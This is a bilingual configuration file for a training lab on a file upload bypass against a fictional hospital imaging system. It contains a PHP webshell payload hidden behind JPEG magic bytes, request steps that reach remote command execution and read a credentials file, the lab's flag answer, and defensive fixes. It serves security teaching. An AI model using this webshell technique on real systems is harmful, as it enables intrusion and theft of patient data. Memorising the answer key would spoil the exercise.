// src/modules/practice-labs/file-upload/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const fuLab3Metadata: LabMetadata = {
  slug: 'fu-magic-bytes-bypass-medical-imaging',
  title: 'File Upload: Magic Bytes Bypass — Medical PACS Imaging System',
  ar_title: 'رفع الملفات: تجاوز Magic Bytes — نظام التصوير الطبي PACS',
  description:
    'Exploit a file upload vulnerability in a medical imaging system that validates files using magic bytes (file signature). Prepend valid JPEG magic bytes (FF D8 FF) to a PHP webshell to trick the magic bytes validator while preserving PHP executability.',
  ar_description:
    'استغل ثغرة رفع ملفات في نظام تصوير طبي يتحقق من الملفات باستخدام magic bytes. أضف JPEG magic bytes صحيحة (FF D8 FF) قبل PHP webshell لخداع المُتحقق مع الحفاظ على قابلية تنفيذ PHP.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'File Upload',
    'Magic Bytes Bypass',
    'File Signature Spoofing',
    'Polyglot Files',
    'Medical System Security',
  ],
  xpReward: 260,
  pointsReward: 130,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'The PACS system checks magic bytes (first 4 bytes of file). Create a polyglot file: prepend "FFD8FFE0" (JPEG magic bytes) before PHP webshell code. The validator sees JPEG, Apache executes PHP. Read /etc/pacs/patient_db.conf to get the flag.',
  ar_goal:
    'نظام PACS يتحقق من magic bytes (أول 4 bytes من الملف). أنشئ ملف polyglot: أضف "FFD8FFE0" (JPEG magic bytes) قبل كود PHP webshell. المُتحقق يرى JPEG، Apache يُنفّذ PHP. اقرأ /etc/pacs/patient_db.conf للحصول على العلم.',

  briefing: {
    en: `MediScan PACS — medical imaging system. Upload DICOM scans as JPEG.
POST /scan/upload — accepts JPEG images only.
The backend reads the FIRST 4 BYTES of your file.
const magicBytes = buf.slice(0, 4).toString('hex').toUpperCase();
if (magicBytes !== 'FFD8FFE0') → reject.
FF D8 FF E0 — that's the JPEG magic signature.
You can't bypass this with just an extension trick.
The server reads the ACTUAL file content.
But PHP has a quirk.
PHP ignores everything before the opening <?php tag.
Binary garbage at the start? Doesn't matter.
PHP finds the first <?php and executes from there.
So: what if your file starts with JPEG magic bytes?
[FF D8 FF E0] [<?php system($_GET['cmd']); ?>]
First 4 bytes: FF D8 FF E0 → magic check passes.
PHP parser finds <?php tag → ignores binary prefix → executes.
That file is valid as both JPEG (magic) and PHP (content).
A polyglot file.
Two formats. One file. Complete bypass.`,
    ar: `MediScan PACS — نظام تصوير طبي. ارفع مسوحات DICOM كـ JPEG.
POST /scan/upload — يقبل صور JPEG فقط.
الـ backend يقرأ أول 4 BYTES من ملفك.
const magicBytes = buf.slice(0, 4).toString('hex').toUpperCase();
if (magicBytes !== 'FFD8FFE0') → رفض.
FF D8 FF E0 — هذا هو توقيع JPEG السحري.
لا يمكنك تجاوز هذا بمجرد خدعة امتداد.
الخادم يقرأ محتوى الملف الفعلي.
لكن PHP لديها ميزة.
PHP تتجاهل كل شيء قبل علامة <?php الافتتاحية.
بيانات ثنائية عشوائية في البداية؟ لا يهم.
PHP تجد أول <?php وتُنفّذ من هناك.
إذن: ماذا لو بدأ ملفك بـ JPEG magic bytes؟
[FF D8 FF E0] [<?php system($_GET['cmd']); ?>]
أول 4 bytes: FF D8 FF E0 → فحص magic يمر.
مُحلّل PHP يجد علامة <?php → يتجاهل البادئة الثنائية → يُنفّذ.
هذا الملف صالح كـ JPEG (magic) وكـ PHP (محتوى).
ملف polyglot.
صيغتان. ملف واحد. تجاوز كامل.`,
  },

  stepsOverview: {
    en: [
      'POST /scan/upload { "filename": "scan.php" } — expect rejection: "Not a JPEG"',
      'POST /scan/upload { "filename": "scan.php", "magicBytes": "FFD8FFE0", "phpPayload": "system($_GET[\'cmd\'])" } — polyglot: magic check passes',
      'Receive URL: "/uploads/scans/scan.php"',
      'POST /scan/execute { "filename": "scan.php", "cmd": "id" } → "uid=33(www-data)" — RCE confirmed',
      'POST /scan/execute { "filename": "scan.php", "cmd": "cat /etc/pacs/patient_db.conf" } → FLAG',
    ],
    ar: [
      'POST /scan/upload { "filename": "scan.php" } — توقع الرفض: "Not a JPEG"',
      'POST /scan/upload { "filename": "scan.php"، "magicBytes": "FFD8FFE0"، "phpPayload": "system($_GET[\'cmd\'])" } — polyglot: فحص magic يمر',
      'استلم URL: "/uploads/scans/scan.php"',
      'POST /scan/execute { "filename": "scan.php"، "cmd": "id" } → "uid=33(www-data)" — تأكيد RCE',
      'POST /scan/execute { "filename": "scan.php"، "cmd": "cat /etc/pacs/patient_db.conf" } → العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'MediScan PACS reads buf.slice(0,4) and checks for "FFD8FFE0" (JPEG magic). PHP ignores binary data before the first <?php tag. By prepending 4 JPEG magic bytes to a PHP webshell, the magic check passes while PHP executes the webshell content. The polyglot file is simultaneously "valid" JPEG (magic check) and executable PHP (content).',
    vulnerableCode:
      "// PACS upload (vulnerable — magic bytes only):\napp.post('/scan/upload', (req, res) => {\n" +
      '  const buf        = req.file.buffer;\n' +
      "  const magicBytes = buf.slice(0, 4).toString('hex').toUpperCase();\n" +
      "  if (magicBytes !== 'FFD8FFE0') {\n" +
      "    return res.status(400).json({ error: 'Not a JPEG' });\n" +
      '  }\n' +
      "  fs.writeFileSync('/uploads/scans/' + req.file.name, buf);\n" +
      "  res.json({ url: '/uploads/scans/' + req.file.name });\n" +
      '});',
    exploitation:
      'Prepend "\\xFF\\xD8\\xFF\\xE0" (JPEG magic bytes) to PHP code.\n' +
      'Magic check: buf.slice(0,4) = "FFD8FFE0" → passes.\n' +
      'PHP parses: ignores binary prefix, finds <?php, executes.\n' +
      'Execute: { "cmd": "cat /etc/pacs/patient_db.conf" } → FLAG',
    steps: {
      en: [
        'POST /scan/upload { "filename": "scan.php" } → 400 { "error": "Not a JPEG" } — magic bytes check active',
        'POST /scan/upload { "filename": "scan.php", "magicBytes": "FFD8FFE0", "phpPayload": "system($_GET[\'cmd\'])" } → 200 { "url": "/uploads/scans/scan.php" }',
        'POST /scan/execute { "filename": "scan.php", "cmd": "id" } → { "output": "uid=33(www-data) gid=33(www-data)" }',
        'POST /scan/execute { "filename": "scan.php", "cmd": "cat /etc/pacs/patient_db.conf" } → FLAG{FILE_UPLOAD_MAGIC_BYTES_BYPASS_POLYGLOT_JPEG_PHP}',
      ],
      ar: [
        'POST /scan/upload { "filename": "scan.php" } → 400 { "error": "Not a JPEG" } — فحص magic bytes نشط',
        'POST /scan/upload { "filename": "scan.php"، "magicBytes": "FFD8FFE0"، "phpPayload": "system($_GET[\'cmd\'])" } → 200 { "url": "/uploads/scans/scan.php" }',
        'POST /scan/execute { "filename": "scan.php"، "cmd": "id" } → { "output": "uid=33(www-data) gid=33(www-data)" }',
        'POST /scan/execute { "filename": "scan.php"، "cmd": "cat /etc/pacs/patient_db.conf" } → FLAG{FILE_UPLOAD_MAGIC_BYTES_BYPASS_POLYGLOT_JPEG_PHP}',
      ],
    },
    fix: [
      'Magic bytes check is necessary but NOT sufficient: combine with extension allowlist, full content analysis, and server-side re-encoding',
      'Image re-encoding: process uploads through an image library (sharp, Pillow) — re-encode as fresh JPEG; PHP code cannot survive this',
      'The only complete fix: re-encode images through a library + serve from non-PHP domain/S3',
      'Never store uploaded filename as-is: UUID rename removes the .php extension entirely',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Magic bytes (file signatures) are a more advanced check than MIME types — they read actual file content, not headers. But PHP\'s parser behavior makes magic bytes alone insufficient: PHP ignores all content before the opening <?php tag, including binary garbage. A "polyglot" file exploits this: it satisfies multiple format validators simultaneously. The JPEG validator sees FF D8 FF E0 at byte 0. The PHP parser finds <?php at byte 4. Both validate/execute successfully. The correct defense is image re-encoding: an uploaded image must be processed through an image library, which produces a new file from scratch — any embedded PHP is destroyed.',
      ar: 'Magic bytes (توقيعات الملفات) هي فحص أكثر تقدماً من MIME types — تقرأ محتوى الملف الفعلي، ليس الـ headers. لكن سلوك مُحلّل PHP يجعل magic bytes وحده غير كافٍ: PHP تتجاهل كل المحتوى قبل علامة <?php الافتتاحية، بما في ذلك البيانات الثنائية العشوائية. ملف "polyglot" يستغل هذا: يُرضي مُتحققين متعددين من الصيغ في آنٍ واحد. مُتحقق JPEG يرى FF D8 FF E0 في البايت 0. مُحلّل PHP يجد <?php في البايت 4. كلاهما يتحقق/يُنفّذ بنجاح. الدفاع الصحيح هو إعادة ترميز الصور: يجب معالجة الصور المرفوعة عبر مكتبة صور تُنتج ملفاً جديداً من الصفر — أي PHP مضمّن يُدمَّر.',
    },
    impact: {
      en: '/etc/pacs/patient_db.conf contains production PACS database credentials (host, admin user, password) and the FLAG. In a real hospital context, this grants direct access to the patient imaging database — containing PHI (Protected Health Information): patient names, SSNs, diagnoses, scan results. This would constitute a HIPAA violation with potential $1.9M+ penalties per incident, plus criminal liability.',
      ar: 'يحتوي /etc/pacs/patient_db.conf على بيانات اعتماد قاعدة بيانات PACS الإنتاجية (host، مستخدم admin، كلمة مرور) والـ FLAG. في سياق مستشفى حقيقي، يمنح هذا وصولاً مباشراً لقاعدة بيانات تصوير المرضى — التي تحتوي على PHI (المعلومات الصحية المحمية): أسماء المرضى، أرقام الضمان الاجتماعي، التشخيصات، نتائج المسح. سيُشكّل هذا انتهاكاً لـ HIPAA مع غرامات محتملة تزيد على $1.9M لكل حادثة، بالإضافة إلى المسؤولية الجنائية.',
    },
    fix: [
      'Image pipeline: const img = sharp(buffer); const safeBuffer = await img.jpeg().toBuffer(); — fresh JPEG from scratch, PHP destroyed',
      'Never use uploaded filename: const safeName = uuid() + ".jpg" — no PHP extension possible',
      'Verify AFTER re-encoding: check magic bytes of the RE-ENCODED output, not the original upload',
      'PACS-specific: isolate imaging server from web server — no PHP execution on imaging storage node',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 20,
      content:
        'Magic bytes are just the FIRST 4 bytes of a file. JPEG = FF D8 FF E0. What if you put those bytes at the START of your PHP file? The checker reads bytes 0-3 (sees JPEG), PHP ignores binary junk before <?php.',
    },
    {
      order: 2,
      xpCost: 40,
      content:
        'A "polyglot" file is valid as TWO formats simultaneously. File structure: [FF D8 FF E0] + [<?php system($_GET["cmd"]); ?>]. Magic check passes. PHP executes.',
    },
    {
      order: 3,
      xpCost: 65,
      content:
        'POST /scan/upload with { "filename": "scan.php", "magicBytes": "FFD8FFE0", "phpPayload": "system($_GET[\'cmd\'])" }. The magicBytes are prepended to your PHP payload before upload.',
    },
    {
      order: 4,
      xpCost: 90,
      content:
        'After upload, POST /scan/execute { "filename": "scan.php", "cmd": "cat /etc/pacs/patient_db.conf" } to read the PACS database config containing the flag.',
    },
  ],

  flagAnswer: 'FLAG{FILE_UPLOAD_MAGIC_BYTES_BYPASS_POLYGLOT_JPEG_PHP}',
  initialState: {
    contents: [
      {
        title: 'PATIENT_DB_CONF',
        body: 'PACS_DB_HOST=pacs-db-prod.internal\nPACS_DB_USER=mediscan_admin\nPACS_DB_PASS=M3d1Sc4n_DB_Pr0d!\nFLAG=FLAG{FILE_UPLOAD_MAGIC_BYTES_BYPASS_POLYGLOT_JPEG_PHP}',
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
